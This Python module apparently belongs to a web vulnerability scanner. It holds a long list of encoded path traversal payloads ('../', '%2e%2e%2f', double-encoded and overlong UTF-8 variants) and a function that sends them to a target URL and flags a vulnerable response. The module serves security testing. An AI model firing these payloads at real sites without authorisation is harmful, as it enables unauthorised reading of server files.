import os
from urllib.parse import urljoin, urlparse
import requests
from analyze_resp import resp_analyze
from payload import gen_pathtraversal
from process_Form import process_form

paths = [
    "../../{file}",
    "../../../{file}",
    "../../../../{file}",
    "../../../../../{file}",
    "../../../../../../{file}",
    "../../../../../../../{file}",
    "../../../../../../../../{file}",
    "../{file}",
    "..%2f{file}",
    "..%2f..%2f{file}",
    "..%2f..%2f..%2f{file}",
    "..%2f..%2f..%2f..%2f{file}",
    "..%2f..%2f..%2f..%2f..%2f{file}",
    "..%2f..%2f..%2f..%2f..%2f..%2f{file}",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}",
    "%2e%2e/{file}",
    "%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}",
    "%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}",
    "..%252f{file}",
    "..%252f..%252f{file}",
    "..%252f..%252f..%252f{file}",
    "..%252f..%252f..%252f..%252f{file}",
    "..%252f..%252f..%252f..%252f..%252f{file}",
    "..%252f..%252f..%252f..%252f..%252f..%252f{file}",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}",
    "%252e%252e/{file}",
    "%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}",
    "%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}",
    "..\\{file}",
    "..\\..\\{file}",
    "..\\..\\..\\{file}",
    "..\\..\\..\\..\\{file}",
    "..\\..\\..\\..\\..\\{file}",
    "..\\..\\..\\..\\..\\..\\{file}",
    "..\\..\\..\\..\\..\\..\\..\\{file}",
    "..\\..\\..\\..\\..\\..\\..\\..\\{file}",
    "..%5c{file}",
    "..%5c..%5c{file}",
    "..%5c..%5c..%5c{file}",
    "..%5c..%5c..%5c..%5c{file}",
    "..%5c..%5c..%5c..%5c..%5c{file}",
    "..%5c..%5c..%5c..%5c..%5c..%5c{file}",
    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}",
    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}",
    "%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}",
    "%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{file}",
    "..%255c{file}",
    "..%255c..%255c{file}",
    "..%255c..%255c..%255c{file}",
    "..%255c..%255c..%255c..%255c{file}",
    "..%255c..%255c..%255c..%255c..%255c{file}",
    "..%255c..%255c..%255c..%255c..%255c..%255c{file}",
    "..%255c..%255c..%255c..%255c..%255c..%255c..%255c{file}",
    "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{file}",
    "%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\{file}",
    "%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}",
    "..%c0%af{file}",
    "..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}",
    "%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}"
]
def path_trav(form_data, flag):
    url = process_form(form_data)  # Process input URL
    parsed_url = urlparse(url)
    key_value = os.path.basename(parsed_url.path)  # Extract filename from URL path

    responses = []
    for path in paths:
        if flag == 1:
            break
        payload = path.format(file=key_value)  # Replace {file} with key_value
        target_url = url.rstrip("/") + payload #concatenate with basse url
        try:
            response = requests.get(target_url)
            response_entry = {
                "url": target_url,
                "status": response.status_code
            }
            if response.status_code == 200:
                resp_res = resp_analyze(payload, response.content)
                if resp_res == 'Y':
                    response_entry["Result after response analysis"] = "VULNERABLE"
                    flag = 1
                    responses.append(response_entry)
                    break
            responses.append(response_entry)
        except requests.RequestException as e:
            responses.append({
                "url": target_url,
                "status": f"Error: {str(e)}"
            })
    return responses, flag